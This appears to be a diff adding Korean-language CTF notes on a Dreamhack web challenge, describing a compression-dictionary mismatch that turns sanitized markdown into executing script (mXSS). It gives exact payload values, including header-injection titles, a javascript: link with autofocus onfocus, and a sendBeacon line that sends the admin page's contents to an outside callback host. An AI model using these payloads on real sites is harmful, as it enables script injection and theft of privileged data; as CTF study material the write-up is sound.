@@ -41,6 +41,29 @@
 
 ## Web 특수 사례
 
+### Dreamhack PublicDocs — CDT wrong-dictionary mXSS
+
+구조:
+1. `/doc/<id>/<ver>`가 `Use-As-Dictionary: id=<dict_id>, match="/doc/<id>/*"`를 내려줌
+2. `dict_id`가 `title`에서 만들어져 structured-header injection 가능
+3. 서버는 `Dictionary-ID`가 캐시에 있으면 그 body로 압축하지만, `Available-Dictionary` hash와 실제 body 일치 여부는 검증하지 않음
+4. 그래서 브라우저는 공격자 버전 B1을 victim id로 저장하고, 서버는 victim 문서 A로 B2를 압축하게 만들 수 있음
+5. 잘 맞는 title/content 조합에서는 sanitized markdown이 wrong decompression 후 `<a href="javascript:...">` + `autofocus onfocus=...`로 변형되어 실행됨
+
+실전 값:
+- victim dictionary title: `AAAAAE`
+- B1 title:
+  `",id="dict-<A_DOC>-AAAAAE-v1",a="x`
+- B1 content:
+  `[x](java "autofocus onfocus=location=href//")`
+- B2 title:
+  `script:(async()=>navigator.sendBeacon('//callback',await(await fetch('/admin')).text()))()//`
+
+핵심 포인트:
+- victim dictionary A는 bot보다 먼저 직접 요청해서 서버 캐시를 워밍해야 했다.
+- 같은 origin에 쓰기 가능한 sink가 없어도 `navigator.sendBeacon('//callback', ...)`로 외부 회수가 더 짧고 안정적이었다.
+- 길고 복잡한 `fetch('/edit/...',{method:'POST',...})` 페이로드는 decompression drift로 속성 경계가 깨졌고, 짧은 beacon payload는 안정적으로 `href` 안에 남았다.
+
 ### Dreamhack Go Through Me — user-panel bot -> admin-app Automad RCE
 
 구조:
